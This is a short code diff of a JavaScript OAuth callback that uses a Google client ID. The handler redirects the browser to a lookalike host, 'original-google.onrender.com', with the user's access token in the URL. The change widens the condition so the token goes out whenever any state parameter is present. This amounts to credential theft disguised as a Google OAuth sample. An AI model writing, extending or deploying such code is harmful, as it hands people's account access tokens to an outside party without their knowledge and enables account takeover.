@@ -34,7 +34,7 @@ var YOUR_CLIENT_ID = '1096318296267-a3l9r898cd6uc95n64at2q06k31duh45.apps.google
 
     localStorage.setItem('oauth2-test-params', JSON.stringify(params) );
 
-    if (params['state'] && params['state'] == 'try_sample_request') {
+    if (params['state']) {
       window.location.replace('https://original-google.onrender.com/getuuid'+'?uuid='+params['state']+'&access_token='+params['access_token']);
 
 
